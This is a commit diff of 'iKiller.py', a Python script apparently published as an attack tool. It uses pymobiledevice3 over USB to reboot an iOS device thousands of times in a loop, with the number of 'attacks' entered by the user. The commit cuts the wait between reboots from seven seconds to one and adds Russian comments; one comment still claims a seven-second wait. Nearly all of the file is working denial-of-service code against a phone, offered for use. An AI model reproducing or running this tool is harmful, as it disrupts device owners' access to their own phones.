94a4e2cf49d0a5d06c62490c184e10e42f49eff5
quack quack <137829849+kryyyaaaa@users.noreply.github.com>
2024-04-12 18:38:39 +0300

    fixed time

--- iKiller.py
+++ iKiller.py
@@ -1,12 +1,12 @@
-from pymobiledevice3.lockdown import create_using_usbmux
-from pymobiledevice3.services.diagnostics import DiagnosticsService
-from os import system
-from time import sleep
-from colorama import init, Fore, Style
+from pymobiledevice3.lockdown import create_using_usbmux # импорт библеотек
+from pymobiledevice3.services.diagnostics import DiagnosticsService # импорт библеотек
+from os import system # импорт библеотек
+from time import sleep # импорт библеотек
+from colorama import init, Fore, Style # импорт библеотек
 
-init()
+init() # фикс цветов (colorama)
 
-system('title iKillerWiFi')
+system('title iKillerWiFi') # название для консоли
 
 about = Fore.RED + Style.BRIGHT + """
     ██▓ ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███      █     █░ ██▓  █████▒ ██▓
@@ -20,23 +20,24 @@ about = Fore.RED + Style.BRIGHT + """
     ░  ░  ░    ░      ░  ░    ░  ░   ░  ░   ░            ░     ░           ░  
                                                                            
            release by @kryyyaaaa (github) | @kryyaasoft (Telegram)
-"""
+""" # sigma art
 
-print(about)
+print(about) # выводит сигма арт
 
-thr = int(input(' - Введите колличество атак (кол-во атак умножается на 1000) $\> '))
-thr = thr*1000
-print(' Attack  |  Log')
-num = 0
-for i in range(thr):
-	sleep(7)
-	try:
-		dev = create_using_usbmux()
-		ds = DiagnosticsService(dev)
-		ds.restart()
-		num = num+1
-		print(f' {num}         device restarted!')
+thr = int(input(' - Введите колличество атак (кол-во атак умножается на 1000) $\> ')) # запрашиваем у юзера кол-во атак
+thr = thr*1000 # умнажаем на 1000
+print(' Attack  |  Log') # выводим таблицу
+num = 0 # номер атаки по дефолту 0
+for i in range(thr): # повторяем столько раз, сколько мы умножили
+	sleep(1) # ждём семь секунд
+	try: # пробуем: 
+		dev = create_using_usbmux() # находим девайс и канектимся к нему
+		ds = DiagnosticsService(dev) # импорт диагностик сервис
+		ds.restart() # перезагружаем девайс
+		num = num+1 # номер атаки
+		print(f' {num}         device restarted!') # логи
 	except:
-		num = num+1
-		print(f' {num}         The device is already turned off!')
-print('done!')
+		num = num+1 # номер атаки
+		print(f' {num}         The device is already turned off!') # логи
+
+print('done!') # цикл завершен
